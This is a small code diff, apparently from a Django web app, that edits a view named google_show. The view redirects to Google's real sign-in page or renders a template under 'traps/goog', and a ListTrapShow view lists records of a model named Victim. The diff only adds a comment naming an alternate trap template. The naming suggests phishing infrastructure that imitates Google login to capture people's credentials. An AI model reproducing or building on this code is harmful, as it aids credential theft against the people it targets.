@@ -50,7 +50,7 @@ def google_show(request):
         return redirect('https://accounts.google.com/InteractiveLogin/signinchooser?continue=https%3A%2F%2Fwww.google.com%2F&ec=GAZAmgQ&hl=tr&passive=true&ifkv=AVQVeyzlnmLJTmZibmoikdTTu_5Erw5RP_4BV2m08eph1vOJMAeSiGq3a61-pqTUpwHfjZiV0zkq-A&theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin')
 
     else:
-        return render(request, 'traps/goog/backup.html')
+        return render(request, 'traps/goog/backup.html') #traps/goog/backup.html    'traps/goog/reserve/backup - secour.html'
 
 class ListTrapShow(ListView):
     model = Victim
